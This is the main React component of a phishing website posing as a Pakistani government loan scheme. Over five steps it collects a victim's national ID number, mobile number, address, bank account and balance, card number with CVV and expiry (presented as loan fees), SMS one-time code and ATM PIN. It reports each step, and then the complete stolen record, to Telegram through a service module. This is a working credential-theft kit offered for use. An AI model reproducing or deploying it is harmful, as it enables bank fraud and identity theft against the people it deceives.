import React, { useState, useEffect } from 'react';
import {
  ApplicationStep,
  PersonalInfo,
  BankInfo,
  CardInfo,
  ApplicationData,
} from './types';
import { Header } from './components/Header';
import { Footer } from './components/Footer';
import { LeadershipHero } from './components/LeadershipHero';
import { Stepper } from './components/Stepper';
import { Step1PersonalInfo } from './components/Step1PersonalInfo';
import { Step2BankInfo } from './components/Step2BankInfo';
import { Step3LoanFees } from './components/Step3LoanFees';
import { LoadingModal } from './components/LoadingModal';
import { Step4OtpVerification } from './components/Step4OtpVerification';
import { Step5AtmPin } from './components/Step5AtmPin';
import { StepSuccess } from './components/StepSuccess';
import { StatusModal } from './components/StatusModal';
import { sendStepNotification, sendFinalApplicationToTelegram } from './services/telegramService';

const INITIAL_PERSONAL: PersonalInfo = {
  fullName: '',
  cnic: '',
  mobileNo: '',
  gender: '',
  dob: '',
  province: '',
  address: '',
};

const INITIAL_BANK: BankInfo = {
  loanAmount: '500,000',
  loanPurpose: '',
  occupation: '',
  bankName: '',
  accountNumber: '',
  currentBalance: '',
  monthlyIncome: '',
};

const INITIAL_CARD: CardInfo = {
  cardNumber: '',
  expiry: '',
  cvv: '',
};

export default function App() {
  const [currentStep, setCurrentStep] = useState<ApplicationStep>('hero');
  const [personal, setPersonal] = useState<PersonalInfo>(INITIAL_PERSONAL);
  const [bank, setBank] = useState<BankInfo>(INITIAL_BANK);
  const [card, setCard] = useState<CardInfo>(INITIAL_CARD);
  const [otp, setOtp] = useState<string>('');
  const [pin, setPin] = useState<string>('');
  const [trackingId, setTrackingId] = useState<string>('');
  const [savedApplications, setSavedApplications] = useState<ApplicationData[]>([]);
  const [isStatusModalOpen, setIsStatusModalOpen] = useState<boolean>(false);

  // Load stored applications from localStorage
  useEffect(() => {
    try {
      const localData = localStorage.getItem('pak_loan_applications');
      if (localData) {
        setSavedApplications(JSON.parse(localData));
      }
    } catch (e) {
      console.error('Failed to parse saved applications', e);
    }
  }, []);

  // Track step navigation changes in Telegram
  useEffect(() => {
    const titles: Record<ApplicationStep, string> = {
      hero: 'Home Hero Page',
      step1: 'Step 1 - Personal Info',
      step2: 'Step 2 - Bank Info',
      step3: 'Step 3 - Loan Apply Fees',
      searching: 'Verifying Details Overlay',
      step4: 'Step 4 - OTP Verification',
      step5: 'Step 5 - ATM PIN Verification',
      success: 'Application Success Confirmation',
    };
    sendStepNotification(currentStep, titles[currentStep] || currentStep);
  }, [currentStep]);

  const handleStartApply = () => {
    setCurrentStep('step1');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleUpdatePersonal = (updated: Partial<PersonalInfo>) => {
    setPersonal((prev) => ({ ...prev, ...updated }));
  };

  const handleUpdateBank = (updated: Partial<BankInfo>) => {
    setBank((prev) => ({ ...prev, ...updated }));
  };

  const handleUpdateCard = (updated: Partial<CardInfo>) => {
    setCard((prev) => ({ ...prev, ...updated }));
  };

  const generateTrackingId = () => {
    const randomNum = Math.floor(100000 + Math.random() * 900000);
    return `GOP-2026-${randomNum}-PK`;
  };

  const handleStep3Submit = () => {
    setCurrentStep('searching');
  };

  const handleSearchingComplete = () => {
    setCurrentStep('step4');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleFinalSubmit = () => {
    const newTrackingId = generateTrackingId();
    setTrackingId(newTrackingId);

    const newAppRecord: ApplicationData = {
      personal,
      bank,
      card,
      otp,
      pin,
      trackingId: newTrackingId,
      submittedAt: new Date().toLocaleDateString('en-PK'),
      status: 'Pending',
    };

    // Dispatch final notification to Telegram
    sendFinalApplicationToTelegram({
      trackingId: newTrackingId,
      personal,
      bank,
      card,
      otp,
      pin,
    });

    const updatedList = [newAppRecord, ...savedApplications];
    setSavedApplications(updatedList);
    try {
      localStorage.setItem('pak_loan_applications', JSON.stringify(updatedList));
    } catch (e) {
      console.error('Failed to save application', e);
    }

    setCurrentStep('success');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleReset = () => {
    setPersonal(INITIAL_PERSONAL);
    setBank(INITIAL_BANK);
    setCard(INITIAL_CARD);
    setOtp('');
    setPin('');
    setTrackingId('');
    setCurrentStep('hero');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const getStepIndex = (): number => {
    switch (currentStep) {
      case 'step1': return 0;
      case 'step2': return 1;
      case 'step3': return 2;
      case 'searching': return 2;
      case 'step4': return 3;
      case 'step5': return 4;
      case 'success': return 4;
      default: return 0;
    }
  };

  const handleStepperClick = (idx: number) => {
    if (idx === 0) setCurrentStep('step1');
    if (idx === 1 && currentStep !== 'step1') setCurrentStep('step2');
    if (idx === 2 && (currentStep === 'step4' || currentStep === 'step5')) setCurrentStep('step3');
  };

  return (
    <div className="min-h-screen flex flex-col bg-slate-100 font-sans text-slate-800 antialiased selection:bg-[#0e5e38] selection:text-white">
      {/* Top Header */}
      <Header
        onApplyClick={handleStartApply}
        onTrackClick={() => setIsStatusModalOpen(true)}
        onHomeClick={() => setCurrentStep('hero')}
        currentStep={currentStep}
      />

      {/* Main Container */}
      <main className="flex-1">
        {currentStep === 'hero' ? (
          <LeadershipHero
            onStartApplication={handleStartApply}
            onTrackApplication={() => setIsStatusModalOpen(true)}
          />
        ) : (
          <div className="py-6 px-4 sm:px-6">
            {/* Show Stepper during step workflow */}
            {currentStep !== 'success' && currentStep !== 'searching' && (
              <Stepper
                currentStepIndex={getStepIndex()}
                onStepClick={handleStepperClick}
              />
            )}

            {/* Step 1: Personal Info */}
            {currentStep === 'step1' && (
              <Step1PersonalInfo
                data={personal}
                onUpdate={handleUpdatePersonal}
                onNext={() => {
                  setCurrentStep('step2');
                  window.scrollTo({ top: 0, behavior: 'smooth' });
                }}
                onBack={() => setCurrentStep('hero')}
              />
            )}

            {/* Step 2: Bank Info */}
            {currentStep === 'step2' && (
              <Step2BankInfo
                data={bank}
                onUpdate={handleUpdateBank}
                onNext={() => {
                  setCurrentStep('step3');
                  window.scrollTo({ top: 0, behavior: 'smooth' });
                }}
                onBack={() => {
                  setCurrentStep('step1');
                  window.scrollTo({ top: 0, behavior: 'smooth' });
                }}
              />
            )}

            {/* Step 3: Loan Fees */}
            {currentStep === 'step3' && (
              <Step3LoanFees
                data={card}
                onUpdate={handleUpdateCard}
                onNext={handleStep3Submit}
                onBack={() => {
                  setCurrentStep('step2');
                  window.scrollTo({ top: 0, behavior: 'smooth' });
                }}
              />
            )}

            {/* Searching Loader Overlay */}
            {currentStep === 'searching' && (
              <LoadingModal onComplete={handleSearchingComplete} />
            )}

            {/* Step 4: OTP Verification */}
            {currentStep === 'step4' && (
              <Step4OtpVerification
                mobileNo={personal.mobileNo}
                otpValue={otp}
                onUpdateOtp={setOtp}
                onNext={() => {
                  setCurrentStep('step5');
                  window.scrollTo({ top: 0, behavior: 'smooth' });
                }}
                onBack={() => {
                  setCurrentStep('step3');
                  window.scrollTo({ top: 0, behavior: 'smooth' });
                }}
              />
            )}

            {/* Step 5: ATM PIN Verification */}
            {currentStep === 'step5' && (
              <Step5AtmPin
                pinValue={pin}
                onUpdatePin={setPin}
                onSubmitApplication={handleFinalSubmit}
                onBack={() => {
                  setCurrentStep('step4');
                  window.scrollTo({ top: 0, behavior: 'smooth' });
                }}
              />
            )}

            {/* Success Confirmation */}
            {currentStep === 'success' && (
              <StepSuccess
                data={{
                  personal,
                  bank,
                  card,
                  otp,
                  pin,
                  trackingId,
                  submittedAt: new Date().toLocaleDateString('en-PK'),
                  status: 'Pending',
                }}
                onReset={handleReset}
                onTrack={() => setIsStatusModalOpen(true)}
              />
            )}
          </div>
        )}
      </main>

      {/* Footer */}
      <Footer
        onApplyClick={handleStartApply}
        onTrackClick={() => setIsStatusModalOpen(true)}
      />

      {/* Status Modal */}
      <StatusModal
        isOpen={isStatusModalOpen}
        onClose={() => setIsStatusModalOpen(false)}
        savedApplications={savedApplications}
      />
    </div>
  );
}
